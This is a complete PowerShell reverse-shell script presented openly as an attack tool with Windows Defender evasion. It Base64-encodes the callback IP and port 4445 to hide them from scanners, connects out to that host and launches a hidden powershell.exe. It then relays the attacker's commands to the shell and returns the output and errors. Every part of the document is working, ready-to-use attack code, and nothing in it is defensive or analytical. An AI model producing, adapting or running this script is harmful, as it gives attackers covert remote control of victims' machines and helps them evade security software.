# Reverse Shell with Windows Defender Evasion Techniques
# Encoded IP/Port + Stream Optimization + Error Resilience

# Obfuscated target IP (Base64 encoded: '172.22.238.168' -> 'MTcyLjIyLjIzOC4xNjg=')
$EncodedIP = [Convert]::FromBase64String('MTcyLjIyLjIzOC4xNjg=')
$TargetIP = [System.Text.Encoding]::ASCII.GetString($EncodedIP)

# Obfuscated target port (Base64 encoded: '4445' -> 'NDQ0NQ==')
$EncodedPort = [Convert]::FromBase64String('NDQ0NQ==')
$TargetPort = [int][System.Text.Encoding]::ASCII.GetString($EncodedPort)

# Initialize TCP client with timeout
$TCPClient = New-Object System.Net.Sockets.TCPClient
$TCPClient.Connect($TargetIP, $TargetPort)
$NetworkStream = $TCPClient.GetStream()

# Configure streams with UTF8 encoding (avoids garbled text)
$StreamWriter = New-Object System.IO.StreamWriter($NetworkStream, [System.Text.Encoding]::UTF8)
$StreamReader = New-Object System.IO.StreamReader($NetworkStream, [System.Text.Encoding]::UTF8)
$StreamWriter.AutoFlush = $true  # Auto-flush to prevent output delays

# Start PowerShell process with hidden window
$Process = New-Object System.Diagnostics.Process
$Process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo
$Process.StartInfo.FileName = 'powershell.exe'
$Process.StartInfo.Arguments = '-WindowStyle Hidden'  # Hide console window
$Process.StartInfo.RedirectStandardInput = $true
$Process.StartInfo.RedirectStandardOutput = $true
$Process.StartInfo.RedirectStandardError = $true
$Process.StartInfo.UseShellExecute = $false
$Process.StartInfo.CreateNoWindow = $true
$Process.Start()

# Main communication loop
try {
    while ($TCPClient.Connected -and !$Process.HasExited) {
        # Read command from attacker
        $Command = $StreamReader.ReadLine()
        if ($Command -and $Command -ne '') {
            # Write command to PowerShell process
            $Process.StandardInput.WriteLine($Command)
            $Process.StandardInput.Flush()

            # Collect output incrementally (avoids ReadToEnd() blocking)
            $OutputLines = @()
            while ($Process.StandardOutput.Peek() -ne -1) {
                $OutputLines += $Process.StandardOutput.ReadLine()
            }
            # Send output back to attacker
            if ($OutputLines.Count -gt 0) {
                $StreamWriter.WriteLine($OutputLines -join "`n")
            }

            # Collect error output
            $ErrorLines = @()
            while ($Process.StandardError.Peek() -ne -1) {
                $ErrorLines += $Process.StandardError.ReadLine()
            }
            if ($ErrorLines.Count -gt 0) {
                $StreamWriter.WriteLine("[ERROR] $($ErrorLines -join '`n')")
            }
        }
        Start-Sleep -Milliseconds 50  # Reduce CPU usage
    }
}
catch {
    # Handle exceptions gracefully
    $StreamWriter.WriteLine("[EXCEPTION] $_")
}
finally {
    # Cleanup resources
    $Process.StandardInput.Close()
    $Process.StandardOutput.Close()
    $Process.StandardError.Close()
    $Process.WaitForExit()
    $NetworkStream.Close()
    $TCPClient.Close()
}